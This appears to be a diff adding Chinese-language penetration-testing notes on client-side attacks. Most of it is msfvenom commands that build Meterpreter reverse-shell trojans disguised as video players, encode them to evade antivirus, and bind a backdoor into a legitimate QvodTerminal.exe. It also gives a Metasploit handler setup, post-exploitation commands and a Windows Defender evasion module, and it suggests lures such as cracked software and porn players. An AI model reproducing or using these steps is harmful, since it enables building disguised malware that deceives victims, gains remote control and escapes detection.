@@ -1,0 +1,141 @@
+客户端渗透原理
+社会工程学，诱骗执行恶意程序
+伪装；免杀技术躲避安全软件
+免杀：修改二进制软件数据库；加密，特征字符不可读；绕过杀毒软件
+工具：后门工厂
+
+Windows恶意软件获取shell
+工具msfvenom是msfpayload，msfencode的结合，利用msfvenom生成木马，并在目标机执行，在本地监听上线
+venmom毒液
+
+msfvenom生成西瓜影音和快播
+思路：
+kali：
+  handler、payload
+  在192.168.1.53:4444端口监听后门请求
+win7靶机：运行西瓜视频.exe
+
+##一个编码器
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.180 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/西瓜视频1.exe
+#x86，x是小写
+-a 指定架构
+x86 32位；64位也能执行
+-p payload 指定攻击载荷;meterpreter比shell功能更强大
+  msfvenom --list payloads to list | grep -i reverse_tcp | grep -i meterpreter
+  查看载荷；meterpreter比shell更强大，不区分win和Linux
+-b 去掉坏字符；\x00 16进制的空
+-e 指定编码器；免杀
+-i编码次数，数字越大，文件越大
+-f指定输出文件的格式；raw，exe，elf，jar，c语言
+-o指定输出位置
+
+
+##两个编码器
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.180 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a X86 --platform windows -e x86/alpha_upper -i 10 -f exe -o /var/www/html/西瓜视频2.exe
+
+同时支持多个，搞多个端口
+
+
+在线病毒检测网站
+https://www.virscan.org
+https://www.virustotal.com/gui/home/upload
+
+
+
+#############————》监听
+msfdb run
+msf6 > search multi/msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.1.53
+跟生成木马的一致
+msf6 exploit(multi/handler) > run
+设置载荷，跟木马的载荷一致
+meterpreter > getuid
+windows的三种权限：user、administrator、system
+meterpreter > help
+meterpreter > getsystem
+提权
+meterpreter > getpid
+木马进程
+meterpreter > ps
+肉鸡进程
+meterpreter > sysinfo
+系统信息
+meterpreter > screenshot
+截图
+meterpreter > run vnc
+远程查看肉鸡；实时监控
+
+########################################————》模拟给正常软件加后门
+类似win激活工具、私服客户端、盗版游戏、看片神器、裸聊神器、彩票、抢红包软件、PS激活工具、CRT激活工具、注册机。。。
+1.先下载一个绿色版本，免安装的快播软件；
+  不用要植入主程序，捆绑到子程序，容易出错；
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.211.55.6 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe
+
+-p windows/meterpreter/reverse_tcp 载荷，通用Linux和Windows
+x86 x是小写
+-x 指定路径和文件（跟文件挂马）
+
+2.起个诱人的文件夹名称
+看片神器-全网免费-ROOT直播-QVODPlayer
+
+3.肉鸡执行
+
+4.启动监听
+┌──(root💀kali-linux-2021-3)-[~]
+└─# msfconsole 
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+载荷，跟挂马的载荷一致
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set LHOST 10.211.55.6
+msf6 exploit(multi/handler) > run
+
+5.远程操作肉鸡
+meterpreter > getuid
+meterpreter > getsystem
+meterpreter > getpid
+
+################——》利用evasion模块生成木马
+evasion 逃避
+1.生成木马文件
+msf6 > search evasion
+msf6 > use evasion/windows/windows_defender_exe
+msf6 evasion(windows/windows_defender_exe) > show options
+msf6 evasion(windows/windows_defender_exe) > set FILENAME laohe.exe
+msf6 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp
+msf6 evasion(windows/windows_defender_exe) > show options
+msf6 evasion(windows/windows_defender_exe) > set LHOSTS 10.211.55.6
+msf6 evasion(windows/windows_defender_exe) > run
+生成木马文件 /root/.msf4/local/laohe.exe
+
+msf6 evasion(windows/windows_defender_exe) > exit                                                                                                                                         
+┌──(root💀kali-linux-2021-3)-[~]
+└─# mv /root/.msf4/local/laohe.exe /var/www/html
+
+2.启动监听
+msf6 evasion(windows/windows_defender_exe) > use exploit/multi/handler
+可以不用back，直接use
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.211.55.6
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > run
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
